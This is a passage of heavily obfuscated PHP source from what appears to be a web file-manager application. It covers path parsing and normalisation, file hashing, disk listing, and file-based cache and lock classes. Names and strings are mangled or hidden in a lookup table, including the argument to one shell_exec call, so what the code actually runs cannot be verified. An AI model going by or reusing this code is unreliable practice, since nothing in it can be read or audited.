IO::setContent($à˜¨‰ƒ—, json_encode($Áõ¨²Ó)); } $Òğ¡çœÂ = IO::pathFather($à˜¨‰ƒ—); IO::remove($à˜¨‰ƒ—); self::clearEmptyFolder($Òğ¡çœÂ); return !0; } public static function clearEmptyFolder($«ÈÎ¥ØÉ) { $×ò¶¼ô  =& $_SERVER[çâ¥×ø³]; if (trim($«ÈÎ¥ØÉ, $×ò¶¼ô [8]) == trim(self::$_historyBase, $×ò¶¼ô [8])) { return; } $°º²ôèÒ = IO::pathFather($«ÈÎ¥ØÉ); $óÙŞÙó½ = IO::has($«ÈÎ¥ØÉ, !0); if ($óÙŞÙó½[$×ò¶¼ô [223]] > 0 || $óÙŞÙó½[$×ò¶¼ô [224]] > 0) { return; } IO::remove($«ÈÎ¥ØÉ); self::clearEmptyFolder($°º²ôèÒ); } private static function getBasePath() { $ÈëåÛ© =& $_SERVER[çâ¥×ø³]; $¢º¤¬à = Model($ÈëåÛ©[1301])->get($ÈëåÛ©[1302]); if ($¢º¤¬à) { if (!IO::exist($¢º¤¬à)) { IO::mkdir($¢º¤¬à); } if (get_path_this($¢º¤¬à) == $ÈëåÛ©[1287]) { $¦Ò²‰Ø¤ = $ÈëåÛ©[1303] . rand_string(8); @rename($¢º¤¬à, get_path_father($¢º¤¬à) . $ÈëåÛ©[8] . $¦Ò²‰Ø¤); $¢º¤¬à = DATA_PATH . $¦Ò²‰Ø¤ . $ÈëåÛ©[8]; file_put_contents(DATA_PATH . $ÈëåÛ©[1237], $ÈëåÛ©[12]); Model($ÈëåÛ©[1301])->set($ÈëåÛ©[1302], $¢º¤¬à); } return $¢º¤¬à; } $¢º¤¬à = DATA_PATH . $ÈëåÛ©[1303] . rand_string(8) . $ÈëåÛ©[8]; $¢º¤¬à = IO::mkdir($¢º¤¬à); $¢º¤¬à = rtrim($¢º¤¬à, $ÈëåÛ©[8]) . $ÈëåÛ©[8]; file_put_contents($¢º¤¬à . $ÈëåÛ©[1237], $ÈëåÛ©[12]); file_put_contents(DATA_PATH . $ÈëåÛ©[1237], $ÈëåÛ©[12]); Model($ÈëåÛ©[1301])->set($ÈëåÛ©[1302], $¢º¤¬à); return $¢º¤¬à; } } class KodIO { const KOD_SOURCE = "\173\x73\x6f\165\x72\143\145\175"; const KOD_USER_RECYCLE = "\173\165\163\x65\x72\x52\x65\x63\171\143\154\x65\175"; const KOD_USER_FAV = "\173\165\163\x65\x72\106\141\x76\175"; const KOD_USER_FILE_TAG = "\173\x75\x73\145\x72\106\x69\x6c\x65\x54\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\x65\x72\x46\151\154\x65\124\171\160\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\157\165\160\122\157\157\164\123\x65\x6c\146\175"; const KOD_USER_SHARE = "\x7b\165\163\x65\x72\123\150\141\162\145\175"; const KOD_USER_SHARE_LINK = "\x7b\165\163\145\162\x53\x68\x61\162\x65\114\x69\156\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\x61\162\145\x54\157\115\145\175"; const KOD_SHARE_ITEM = "\173\x73\150\x61\162\145\x49\164\x65\155\175"; const KOD_SHARE_LINK = "\173\163\x68\x61\162\145\x49\x74\x65\155\114\151\156\x6b\175"; const KOD_SEARCH = "\x7b\163\145\x61\162\143\x68\175"; const KOD_BLOCK = "\x7b\x62\x6c\x6f\143\153\x7d"; const KOD_IO = "\x7b\151\157\175"; const KOD_USER_RECENT = "\x7b\x75\x73\x65\162\x52\x65\156\x63\145\156\x74\175"; const KOD_USER_DRIVER = "\x7b\x64\162\x69\166\145\x72\175"; public static function typeList() { $‘½Ş—‡Ù =& $_SERVER[çâ¥×ø³]; return array($‘½Ş—‡Ù[1304] => self::KOD_SOURCE, $‘½Ş—‡Ù[1305] => self::KOD_USER_RECYCLE, $‘½Ş—‡Ù[1306] => self::KOD_USER_FAV, $‘½Ş—‡Ù[1307] => self::KOD_USER_FILE_TAG, $‘½Ş—‡Ù[1308] => self::KOD_USER_FILE_TYPE, $‘½Ş—‡Ù[1309] => self::KOD_GROUP_ROOT_SELF, $‘½Ş—‡Ù[1310] => self::KOD_USER_SHARE, $‘½Ş—‡Ù[1311] => self::KOD_USER_SHARE_LINK, $‘½Ş—‡Ù[1312] => self::KOD_USER_SHARE_TO_ME, $‘½Ş—‡Ù[1313] => self::KOD_SHARE_ITEM, $‘½Ş—‡Ù[1314] => self::KOD_SHARE_LINK, $‘½Ş—‡Ù[1315] => self::KOD_SEARCH, $‘½Ş—‡Ù[1316] => self::KOD_BLOCK, $‘½Ş—‡Ù[1317] => self::KOD_IO, $‘½Ş—‡Ù[1318] => self::KOD_USER_RECENT, $‘½Ş—‡Ù[1319] => self::KOD_USER_DRIVER); } public static function parse($ÖÁÖù—´) { $­¡ÓüŒ¨ =& $_SERVER[çâ¥×ø³]; $ÖÁÖù—´ = self::clear($ÖÁÖù—´); $®êÎË® = array_values(self::typeList()); preg_match($­¡ÓüŒ¨[1320], $ÖÁÖù—´, $‚ü­Àç); $ËĞÎÍÛä = array($­¡ÓüŒ¨[464] => !1, $­¡ÓüŒ¨[1321] => !1, $­¡ÓüŒ¨[461] => !1, $­¡ÓüŒ¨[84] => $ÖÁÖù—´, $­¡ÓüŒ¨[1222] => !1, $­¡ÓüŒ¨[1221] => $­¡ÓüŒ¨[12]); if (is_array($‚ü­Àç) && count($‚ü­Àç) == 5) { $âÙàÜ²¯ = $­¡ÓüŒ¨[1322] . $‚ü­Àç[2] . $­¡ÓüŒ¨[371]; if (in_array($âÙàÜ²¯, $®êÎË®)) { $ËĞÎÍÛä[$­¡ÓüŒ¨[1222]] = $‚ü­Àç[1]; $ËĞÎÍÛä[$­¡ÓüŒ¨[33]] = $âÙàÜ²¯; $ËĞÎÍÛä[$­¡ÓüŒ¨[1323]] = substr($âÙàÜ²¯, 1, -1); $ËĞÎÍÛä[$­¡ÓüŒ¨[443]] = $‚ü­Àç[3]; } $ËĞÎÍÛä[$­¡ÓüŒ¨[1221]] = $‚ü­Àç[4]; } $üÇÍ—Î = array($­¡ÓüŒ¨[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ËĞÎÍÛä[$­¡ÓüŒ¨[1286]] = in_array($ËĞÎÍÛä[$­¡ÓüŒ¨[33]], $üÇÍ—Î); return $ËĞÎÍÛä; } public static function isTruePath($˜ç‚¹½) { $Æˆ£Ôó˜ =& $_SERVER[çâ¥×ø³]; if (substr($˜ç‚¹½, 0, 1) != $Æˆ£Ôó˜[1322]) { return !0; } if (strpos($˜ç‚¹½, $Æˆ£Ôó˜[451]) === 0) { return !0; } if (strpos($˜ç‚¹½, $Æˆ£Ôó˜[1290]) === 0) { return !0; } if (strpos($˜ç‚¹½, $Æˆ£Ôó˜[1324]) === 0) { return !0; } if (strpos($˜ç‚¹½, $Æˆ£Ôó˜[1325]) === 0) { return !0; } if (strpos($˜ç‚¹½, $Æˆ£Ôó˜[1326]) === 0) { return !0; } return !1; } public static function clear($„ù®ÊôÅ) { $ÀÅ¨“Éê =& $_SERVER[çâ¥×ø³]; $„ù®ÊôÅ = str_replace(array($ÀÅ¨“Éê[1131], $ÀÅ¨“Éê[246]), $ÀÅ¨“Éê[53], $„ù®ÊôÅ); $„ù®ÊôÅ = str_replace($ÀÅ¨“Éê[97], $ÀÅ¨“Éê[8], $„ù®ÊôÅ); $¸õ¿á÷ = $ÀÅ¨“Éê[1327]; if (substr($„ù®ÊôÅ, 0, 3) == $ÀÅ¨“Éê[1328]) { $„ù®ÊôÅ = substr($„ù®ÊôÅ, 3); } while (strstr($„ù®ÊôÅ, $¸õ¿á÷)) { $„ù®ÊôÅ = str_replace($¸õ¿á÷, $ÀÅ¨“Éê[8], $„ù®ÊôÅ); } $„ù®ÊôÅ = preg_replace($ÀÅ¨“Éê[1329], $ÀÅ¨“Éê[8], $„ù®ÊôÅ); if ($„ù®ÊôÅ == $ÀÅ¨“Éê[8]) { return $ÀÅ¨“Éê[8]; } $„ù®ÊôÅ = rtrim($„ù®ÊôÅ, $ÀÅ¨“Éê[8]); return $„ù®ÊôÅ; } public static function pathTrue($¥÷£é˜Õ) { $‘ÈœîĞ‚ =& $_SERVER[çâ¥×ø³]; if (!$¥÷£é˜Õ) { return $‘ÈœîĞ‚[12]; } $¥÷£é˜Õ = str_replace($‘ÈœîĞ‚[561], $‘ÈœîĞ‚[8], str_replace($‘ÈœîĞ‚[1330], $‘ÈœîĞ‚[8], $¥÷£é˜Õ)); $¥÷£é˜Õ = str_replace($‘ÈœîĞ‚[561], $‘ÈœîĞ‚[8], str_replace($‘ÈœîĞ‚[1330], $‘ÈœîĞ‚[8], $¥÷£é˜Õ)); if (!strstr($¥÷£é˜Õ, $‘ÈœîĞ‚[1328])) { return $¥÷£é˜Õ; } $æ´ñ²µİ = explode($‘ÈœîĞ‚[8], $¥÷£é˜Õ); foreach ($æ´ñ²µİ as $…´ªıï— => $È²Ù—®) { if ($È²Ù—® !== $‘ÈœîĞ‚[1331]) { continue; } for ($çÜ¾Ç×ö = $…´ªıï—; $çÜ¾Ç×ö >= 0; $çÜ¾Ç×ö--) { if ($æ´ñ²µİ[$çÜ¾Ç×ö] === $‘ÈœîĞ‚[10] || $æ´ñ²µİ[$çÜ¾Ç×ö] === $‘ÈœîĞ‚[1331] || $æ´ñ²µİ[$çÜ¾Ç×ö] === -1) { continue; } if ($æ´ñ²µİ[$çÜ¾Ç×ö] === $‘ÈœîĞ‚[12]) { $æ´ñ²µİ[$…´ªıï—] = -1; break; } $æ´ñ²µİ[$…´ªıï—] = -1; $æ´ñ²µİ[$çÜ¾Ç×ö] = -1; break; } } $™ÂêøÅ’ = array(); foreach ($æ´ñ²µİ as $È²Ù—®) { if ($È²Ù—® !== -1) { $™ÂêøÅ’[] = $È²Ù—®; } } $ëû¹æÈÒ = implode($‘ÈœîĞ‚[8], $™ÂêøÅ’); if (strpos($ëû¹æÈÒ, $‘ÈœîĞ‚[1332]) === 0) { $ëû¹æÈÒ = $‘ÈœîĞ‚[1328] . substr($ëû¹æÈÒ, strlen($‘ÈœîĞ‚[1332])); } return $ëû¹æÈÒ; } public static function sourceID($èöÔóºÒ) { $èØÖ×‘İ =& $_SERVER[çâ¥×ø³]; $ù™»”Šë = self::parse($èöÔóºÒ); if ($ù™»”Šë[$èØÖ×‘İ[33]] !== self::KOD_SOURCE) { show_json(LNG($èØÖ×‘İ[1333]), !1); } return $ù™»”Šë[$èØÖ×‘İ[443]]; } public static function make($÷ÅÖÉ¾ ) { if (!$÷ÅÖÉ¾ ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($÷ÅÖÉ¾ )); } public static function makeShare($åŸª‹ÙÈ, $²õøåã) { return self::makePath(self::KOD_SHARE_ITEM, $åŸª‹ÙÈ, $²õøåã); } public static function makeFileTypePath($’”¨ïÄ©) { return self::makePath(self::KOD_USER_FILE_TYPE, $’”¨ïÄ©); } public static function makeFileTagPath($ÍµæÛ¢) { return self::makePath(self::KOD_USER_FILE_TAG, $ÍµæÛ¢); } public static function makePath($™£¡¬¬¤, $şËæÏƒ  = '', $ğ€êËÄá = '') { $­Íìúñ… =& $_SERVER[çâ¥×ø³]; $ÂÜõ ¾â = substr($™£¡¬¬¤, 1, -1); $¤»ˆ“¶ü = $­Íìúñ…[1334] . $ÂÜõ ¾â . $­Íìúñ…[1335] . $şËæÏƒ  . $­Íìúñ…[1336]; $¤»ˆ“¶ü = $ğ€êËÄá ? $¤»ˆ“¶ü . $ğ€êËÄá . $­Íìúñ…[8] : $¤»ˆ“¶ü; return $¤»ˆ“¶ü; } public static function hashPath($şŠÕí, $äíÏŒ˜À = true) { $ õ„ªêÃ =& $_SERVER[çâ¥×ø³]; $÷‡·ÎĞË = is_array($şŠÕí) ? $şŠÕí : IO::info($şŠÕí); $µ§±‘Ÿ¬ = _get($÷‡·ÎĞË, $ õ„ªêÃ[1337], $ õ„ªêÃ[12]); if (!$µ§±‘Ÿ¬ && isset($÷‡·ÎĞË[$ õ„ªêÃ[219]])) { $µ§±‘Ÿ¬ = trim($÷‡·ÎĞË[$ õ„ªêÃ[219]], $ õ„ªêÃ[118]); } if (!$µ§±‘Ÿ¬ && isset($÷‡·ÎĞË[$ õ„ªêÃ[181]]) && $÷‡·ÎĞË[$ õ„ªêÃ[181]]) { $÷‡·ÎĞË = IO::info(KodIO::make($÷‡·ÎĞË[$ õ„ªêÃ[181]])); $µ§±‘Ÿ¬ = _get($÷‡·ÎĞË, $ õ„ªêÃ[1337], $ õ„ªêÃ[12]); } $¦ôò¬úê = md5($÷‡·ÎĞË[$ õ„ªêÃ[84]] . $÷‡·ÎĞË[$ õ„ªêÃ[76]] . $÷‡·ÎĞË[$ õ„ªêÃ[85]]); if (!$µ§±‘Ÿ¬ && file_exists($÷‡·ÎĞË[$ õ„ªêÃ[84]])) { $µ§±‘Ÿ¬ = Cache::get($¦ôò¬úê . $ õ„ªêÃ[1338]); $µ§±‘Ÿ¬ = !1; if (!$µ§±‘Ÿ¬) { $µ§±‘Ÿ¬ = IO::hashSimple($÷‡·ÎĞË[$ õ„ªêÃ[84]]); Cache::set($¦ôò¬úê . $ õ„ªêÃ[1338], $µ§±‘Ÿ¬, 3600 * 24 * 30); } } if ($äíÏŒ˜À && !$µ§±‘Ÿ¬) { } return $µ§±‘Ÿ¬ ? $µ§±‘Ÿ¬ : $¦ôò¬úê; } public static function hashPathSafe($­³í¡‹Ë, $ÈİÑ¥ùµ = true) { $´¼¦™¶Ç =& $_SERVER[çâ¥×ø³]; $«ÏƒñÖº = self::hashPath($­³í¡‹Ë, $ÈİÑ¥ùµ); return md5($«ÏƒñÖº . $´¼¦™¶Ç[1339] . Model($´¼¦™¶Ç[819])->get($´¼¦™¶Ç[820])); } public static function initSystemPath() { $Á‰øÚÁâ =& $_SERVER[çâ¥×ø³]; if (defined($Á‰øÚÁâ[1340])) { return; } define($Á‰øÚÁâ[1340], self::systemPath($Á‰øÚÁâ[179])); define($Á‰øÚÁâ[1341], self::systemPath($Á‰øÚÁâ[1342])); define($Á‰øÚÁâ[1343], self::systemPath($Á‰øÚÁâ[1344])); define($Á‰øÚÁâ[1345], self::systemPath($Á‰øÚÁâ[1346])); IOHistory::bindEvent(); } public static function systemPath($÷º¤ò½¯) { $‘ïµ¸³ =& $_SERVER[çâ¥×ø³]; $·Åííü¹ = $‘ïµ¸³[1347] . ucfirst($÷º¤ò½¯); $¡–ÃÍˆ = Model($‘ïµ¸³[819])->get($·Åííü¹); if ($¡–ÃÍˆ) { return $¡–ÃÍˆ; } if ($÷º¤ò½¯ == $‘ïµ¸³[179]) { $¡–ÃÍˆ = self::make(Model($‘ïµ¸³[874])->systemRootPathAdd($‘ïµ¸³[574])); } else { $¡–ÃÍˆ = self::systemPath($‘ïµ¸³[179]); $Šº™Š¬å = self::sourceID($¡–ÃÍˆ); $¡–ÃÍˆ = self::make(Model($‘ïµ¸³[874])->mkdir($Šº™Š¬å, $÷º¤ò½¯)); } Model($‘ïµ¸³[819])->set($·Åííü¹, $¡–ÃÍˆ); return $¡–ÃÍˆ; } public static function systemFolder($Ï¬£¾ÖÅ) { $©³ÙÚÁó = IO_PATH_SYSTEM_SOURCE . $Ï¬£¾ÖÅ; $‡¿š“òğ = Cache::get($©³ÙÚÁó); if (!$‡¿š“òğ) { $ŠÖôô‘ü = IO::infoFullSimple($©³ÙÚÁó); if (!$ŠÖôô‘ü) { $‡¿š“òğ = IO::mkdir($©³ÙÚÁó, REPEAT_SKIP); } else { $‡¿š“òğ = $ŠÖôô‘ü[$_SERVER[çâ¥×ø³][84]]; } Cache::set($©³ÙÚÁó, $‡¿š“òğ, 3600 * 10); } return $‡¿š“òğ; } public static function defaultDriver() { return Model($_SERVER[çâ¥×ø³][816])->defaultDriver(); } public static function defaultIO() { $²¥ÓÏƒô =& $_SERVER[çâ¥×ø³]; $î“‘¡À‹ = self::defaultDriver(); return $²¥ÓÏƒô[1348] . $î“‘¡À‹[$²¥ÓÏƒô[443]] . $²¥ÓÏƒô[1336]; } public static function defaultDriverInit() { static $Íã¹Â—É = false; if ($Íã¹Â—É) { return $Íã¹Â—É; } $Íã¹Â—É = IO::init(self::defaultIO()); return $Íã¹Â—É; } public static function fileTypeList() { $Ş‘ –Æ =& $_SERVER[çâ¥×ø³]; $¾ ñÚşá = $GLOBALS[$Ş‘ –Æ[6]][$Ş‘ –Æ[1349]]; foreach ($¾ ñÚşá as $åşîñŠç => $Ğ•æÄ›•) { $‚Ó–’Š´ = $Ş‘ –Æ[1350] . $åşîñŠç; $Ò°äëšå = LNG($‚Ó–’Š´); if ($‚Ó–’Š´ != $Ò°äëšå) { $¾ ñÚşá[$åşîñŠç][$Ş‘ –Æ[32]] = $Ò°äëšå; } } return $¾ ñÚşá; } public static function diskList($Œ•¦É¸¶ = true) { $ã½²‚¤‘ = $_SERVER[çâ¥×ø³][1351]; if ($Œ•¦É¸¶) { $±±Œ§”½ = Cache::get($ã½²‚¤‘); if (is_array($±±Œ§”½)) { return $±±Œ§”½; } } $±±Œ§”½ = self::diskListGet(); Cache::set($ã½²‚¤‘, $±±Œ§”½, 60); return $±±Œ§”½; } public static function diskListGet() { $¬”¦© ö =& $_SERVER[çâ¥×ø³]; $ßæ”ñù¹ = array(); if ($GLOBALS[$¬”¦© ö[6]][$¬”¦© ö[1352]] == $¬”¦© ö[1353]) { $î’œ£× = $¬”¦© ö[1354]; for ($·÷ ‹ş† = 0; $·÷ ‹ş† < strlen($î’œ£×); $·÷ ‹ş†++) { $÷­Ôµ×Á = $î’œ£×[$·÷ ‹ş†] . $¬”¦© ö[1355]; if (file_exists($÷­Ôµ×Á)) { $ßæ”ñù¹[] = $÷­Ôµ×Á; } } return $ßæ”ñù¹; } if (!function_exists($¬”¦© ö[98])) { $ßæ”ñù¹[] = $¬”¦© ö[885]; return $ßæ”ñù¹; } $¼éˆÄà´ = explode($¬”¦© ö[246], shell_exec($¬”¦© ö[1356])); array_shift($¼éˆÄà´); array_pop($¼éˆÄà´); $’äÂ€‰ = array($¬”¦© ö[1357], $¬”¦© ö[1358], $¬”¦© ö[1359], $¬”¦© ö[1360], $¬”¦© ö[1361], $¬”¦© ö[1362], $¬”¦© ö[1363], $¬”¦© ö[1364]); foreach ($¼éˆÄà´ as $àÀ§¿èÈ) { $¨àÜüª = preg_split($¬”¦© ö[1365], $àÀ§¿èÈ); $÷­Ôµ×Á = $¨àÜüª[count($¨àÜüª) - 1]; if (!strstr($¨àÜüª[0], $¬”¦© ö[1366]) || !$÷­Ôµ×Á) { continue; } $ô¯ÓšÅñ = rtrim($÷­Ôµ×Á, $¬”¦© ö[8]) . $¬”¦© ö[8]; if (in_array($ô¯ÓšÅñ, $’äÂ€‰)) { continue; } $ßæ”ñù¹[] = $ô¯ÓšÅñ; } return $ßæ”ñù¹; } public static function isSameDisk($Ğ­¤ßÚƒ, $…ƒüÏ¤) { $êõ†“»³ =& $_SERVER[çâ¥×ø³]; if ($GLOBALS[$êõ†“»³[6]][$êõ†“»³[1352]] == $êõ†“»³[1353]) { return strtolower(substr($Ğ­¤ßÚƒ, 0, 1)) == strtolower(substr($…ƒüÏ¤, 0, 1)); } $˜‹ˆï…Ç = self::diskList(); $íûé½Şİ = !1; $İ­¾Ì´Æ = !1; sort($˜‹ˆï…Ç); $˜‹ˆï…Ç = array_reverse($˜‹ˆï…Ç); $Ğ­¤ßÚƒ = rtrim($Ğ­¤ßÚƒ, $êõ†“»³[8]) . $êõ†“»³[8]; $…ƒüÏ¤ = rtrim($…ƒüÏ¤, $êõ†“»³[8]) . $êõ†“»³[8]; foreach ($˜‹ˆï…Ç as $·Ÿ áÇÍ) { $ÌéŸÕ†¶ = strlen($·Ÿ áÇÍ); if (!$íûé½Şİ && substr($Ğ­¤ßÚƒ, 0, $ÌéŸÕ†¶) == $·Ÿ áÇÍ) { $íûé½Şİ = $·Ÿ áÇÍ; } if (!$İ­¾Ì´Æ && substr($…ƒüÏ¤, 0, $ÌéŸÕ†¶) == $·Ÿ áÇÍ) { $İ­¾Ì´Æ = $·Ÿ áÇÍ; } if ($íûé½Şİ && $İ­¾Ì´Æ) { break; } } return $íûé½Şİ === $İ­¾Ì´Æ; } public static function transferType($ş»ø‚á´, $’§Ø·òÔ) { $‡Æîè÷ =& $_SERVER[çâ¥×ø³]; $•˜Ùâòˆ = self::driverType($ş»ø‚á´); $ÜÄ½…”Ó = self::driverType($’§Ø·òÔ); if ($•˜Ùâòˆ[$‡Æîè÷[33]] == $ÜÄ½…”Ó[$‡Æîè÷[33]] && $•˜Ùâòˆ[$‡Æîè÷[1367]] == $ÜÄ½…”Ó[$‡Æîè÷[1367]]) { return $‡Æîè÷[1368]; } if ($•˜Ùâòˆ[$‡Æîè÷[33]] == $‡Æîè÷[918] && $ÜÄ½…”Ó[$‡Æîè÷[33]] == $‡Æîè÷[106]) { return $‡Æîè÷[1247]; } if ($•˜Ùâòˆ[$‡Æîè÷[33]] == $‡Æîè÷[106] && $ÜÄ½…”Ó[$‡Æîè÷[33]] == $‡Æîè÷[918]) { return $‡Æîè÷[107]; } return $‡Æîè÷[1369]; } public static function driverType($åœÎ¥“) { $á­‡éÔü =& $_SERVER[çâ¥×ø³]; $”­†û’ = str_replace($á­‡éÔü[1370], $á­‡éÔü[12], strtolower($åœÎ¥“->getType())); if ($”­†û’ == $á­‡éÔü[806] || $”­†û’ == $á­‡éÔü[1371] || $”­†û’ == $á­‡éÔü[1372]) { $åœÎ¥“ = self::defaultDriverInit(); } else { if ($”­†û’ == $á­‡éÔü[1257] || $”­†û’ == $á­‡éÔü[1373]) { $åœÎ¥“ = IO::init($åœÎ¥“->pathParse[$á­‡éÔü[1204]]); } } $²³ö­íá = $åœÎ¥“->path; $”­†û’ = str_replace($á­‡éÔü[1370], $á­‡éÔü[12], strtolower($åœÎ¥“->getType())); if ($”­†û’ == $á­‡éÔü[106]) { return array($á­‡éÔü[33] => $á­‡éÔü[106], $á­‡éÔü[1367] => $á­‡éÔü[12], $á­‡éÔü[84] => $²³ö­íá, $á­‡éÔü[95] => $åœÎ¥“); } return array($á­‡éÔü[33] => $á­‡éÔü[918], $á­‡éÔü[1367] => $åœÎ¥“->pathDriver, $á­‡éÔü[84] => $²³ö­íá, $á­‡éÔü[95] => $åœÎ¥“); } public static function pathDriverType($òÛ¦Ä‡») { return $òÛ¦Ä‡» ? self::driverType(IO::init($òÛ¦Ä‡»)) : !1; } public static function pathDriverLocal($Ç‰ÇÛûÎ) { $¤ÆˆÀü =& $_SERVER[çâ¥×ø³]; $ÅÅÎüø– = $Ç‰ÇÛûÎ ? self::driverType(IO::init($Ç‰ÇÛûÎ)) : !1; return $ÅÅÎüø–[$¤ÆˆÀü[33]] == $¤ÆˆÀü[106] ? !0 : !1; } public static function allowCover($ãğ«Ÿê, $ÀÑŠ‡“ò = true) { $ƒœòˆıé =& $_SERVER[çâ¥×ø³]; if (is_string($ãğ«Ÿê)) { $ãğ«Ÿê = IO::info($ãğ«Ÿê); } if (!$ãğ«Ÿê || $ãğ«Ÿê[$ƒœòˆıé[33]] == $ƒœòˆıé[75] || $ãğ«Ÿê[$ƒœòˆıé[76]] <= 100) { return !1; } if (isset($ãğ«Ÿê[$ƒœòˆıé[1374]]) || !$ãğ«Ÿê[$ƒœòˆıé[84]]) { return !1; } if (isset($ãğ«Ÿê[$ƒœòˆıé[216]]) && !$ãğ«Ÿê[$ƒœòˆıé[216]]) { return !1; } static $ó¿”ä¾Ÿ = false; if (!$ó¿”ä¾Ÿ || !$ÀÑŠ‡“ò) { $ÜÎäÅçÂ = self::driverType(IO::init($ãğ«Ÿê[$ƒœòˆıé[84]])); $Ò–ª‹‘¸ = $ÜÎäÅçÂ[$ƒœòˆıé[95]]; $ó¿”ä¾Ÿ = $ƒœòˆıé[184]; if ($ÜÎäÅçÂ[$ƒœòˆıé[33]] == $ƒœòˆıé[106]) { $ó¿”ä¾Ÿ = $ƒœòˆıé[1375]; } if ($ÜÎäÅçÂ[$ƒœòˆıé[95]] && is_array($ÜÎäÅçÂ[$ƒœòˆıé[95]]->config)) { $âëÏÀ÷ì = $ÜÎäÅçÂ[$ƒœòˆıé[95]]->config; if (isset($âëÏÀ÷ì[$ƒœòˆıé[1376]]) && $âëÏÀ÷ì[$ƒœòˆıé[1376]]) { $ó¿”ä¾Ÿ = $ƒœòˆıé[1375]; } } } return $ó¿”ä¾Ÿ == $ƒœòˆıé[1375] ? !0 : !1; } } goto cªĞö ÷©; D•‰›áŞô: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ŸÊ…ÖùÊ, $‹™…×ô ) { $‚’×ˆ¦ =& $_SERVER[çâ¥×ø³]; $this->cachePath = $ŸÊ…ÖùÊ[$‚’×ˆ¦[84]]; $this->prefix = $‚’×ˆ¦[884]; $this->cacheTime = $‹™…×ô ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($İğ¦‰‰ı) { $ó”’óè± =& $_SERVER[çâ¥×ø³]; $İğ¦‰‰ı = str_replace(array($ó”’óè±[885], $ó”’óè±[97], $ó”’óè±[73]), $ó”’óè±[886], $İğ¦‰‰ı); return $this->cachePath . $ó”’óè±[887] . $İğ¦‰‰ı . $ó”’óè±[888]; } public function set($â•¦ÃØ, $½­Ûèñü, $ÀÈñ¤Ÿ = false) { $ÀÈñ¤Ÿ = $ÀÈñ¤Ÿ ? $ÀÈñ¤Ÿ : $this->cacheTime; $óÍ¢í–° = $this->getFile($â•¦ÃØ); if (file_put_contents($óÍ¢í–°, $this->prefix . $½­Ûèñü, LOCK_EX)) { @touch($óÍ¢í–°, intval(time() + $ÀÈñ¤Ÿ)); clearstatcache(); return !0; } @unlink($óÍ¢í–°); return !1; } public function get($°úœÆ½) { $ìÖ–Óß = $this->getFile($°úœÆ½); if (file_exists($ìÖ–Óß) && filemtime($ìÖ–Óß) < time()) { @unlink($ìÖ–Óß); return !1; } $Ê”¯ÅÎ = @file_get_contents($ìÖ–Óß); return substr($Ê”¯ÅÎ, strlen($this->prefix)); } public function remove($İ‹×É®) { $›÷ÇÈ¸‹ = $this->getFile($İ‹×É®); return @unlink($›÷ÇÈ¸‹); } public function deleteAll() { $ï¾Ë® =& $_SERVER[çâ¥×ø³]; $®­•ÖÓÍ = scandir($this->cachePath); foreach ($®­•ÖÓÍ as $Şóˆ©êî) { $Ÿ¿¹–ÎË = $this->cachePath . $Şóˆ©êî; if (strpos($Ÿ¿¹–ÎË, $ï¾Ë®[888]) && strpos($Ÿ¿¹–ÎË, $ï¾Ë®[889])) { @unlink($Ÿ¿¹–ÎË); } } } public function clearTimeout() { $¨¯îŠ¼ô =& $_SERVER[çâ¥×ø³]; $Ñƒ‡·â” = scandir($this->cachePath); foreach ($Ñƒ‡·â” as $ç Ìºˆ) { $ïÀ…ñË§ = $this->cachePath . $ç Ìºˆ; if (strpos($ïÀ…ñË§, $¨¯îŠ¼ô[888]) && strpos($ïÀ…ñË§, $¨¯îŠ¼ô[889]) && filemtime($ïÀ…ñË§) < time()) { @unlink($ïÀ…ñË§); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $µ…ÁÀ¾å =& $_SERVER[çâ¥×ø³]; if (self::$handle) { return self::$handle; } $œ•¢Úø = $GLOBALS[$µ…ÁÀ¾å[6]][$µ…ÁÀ¾å[393]]; self::$timeout = $œ•¢Úø[$µ…ÁÀ¾å[890]] ? $œ•¢Úø[$µ…ÁÀ¾å[890]] : 10; $ÀÓ»‰Ò = _get($GLOBALS[$µ…ÁÀ¾å[6]], $µ…ÁÀ¾å[891]); $Ú·í‰›¨ = $œ•¢Úø[$µ…ÁÀ¾å[876]] ? $œ•¢Úø[$µ…ÁÀ¾å[876]] : $µ…ÁÀ¾å[214]; if ($Ú·í‰›¨ == $µ…ÁÀ¾å[21] && $ÀÓ»‰Ò == $µ…ÁÀ¾å[13]) { $Ú·í‰›¨ = $µ…ÁÀ¾å[214]; } switch ($Ú·í‰›¨) { case $µ…ÁÀ¾å[879]: self::$handle = new CacheLockRedis(); break; case $µ…ÁÀ¾å[880]: self::$handle = new CacheLockMemcached(); break; case $µ…ÁÀ¾å[21]: self::$handle = new CacheLockDatabase(); break; case $µ…ÁÀ¾å[214]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($µ…ÁÀ¾å[892], $µ…ÁÀ¾å[893]); } return self::$handle; } private static function key($ü²Şû§Ğ) { return $_SERVER[çâ¥×ø³][894] . Cache::key($ü²Şû§Ğ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($™€‰ßú = '') { self::$errorMsg = $™€‰ßú; } public static function lockGlobal($“âÚ®´, $ØØàòÒ) { return self::lock($“âÚ®´, $ØØàòÒ, !0); } public static function lock($ÂòéóÂ, $¤ñ™•ÒĞ = false, $ìäÒÃ€í = false) { $Ä¢©¢†¥ =& $_SERVER[çâ¥×ø³]; $´¨‚åø´ = self::init(); $‹÷ì¯Â® = self::key($ÂòéóÂ); $¤ñ™•ÒĞ = $¤ñ™•ÒĞ ? $¤ñ™•ÒĞ : self::$timeout; $ì‰ìÜŒ = timeFloat(); $»¦‹Ä = $´¨‚åø´->lock($‹÷ì¯Â®, $¤ñ™•ÒĞ); $Õ¶ü›Ê = timeFloat(); if (!$»¦‹Ä) { $ú÷˜“ƒ® = "\154\x6f\x63\x6b\40\145\162\x72\157\x72\73\x6b\x65\x79\75{$ÂòéóÂ}\x3b\164\x69\155\x65\x3d{$¤ñ™•ÒĞ}\73" . 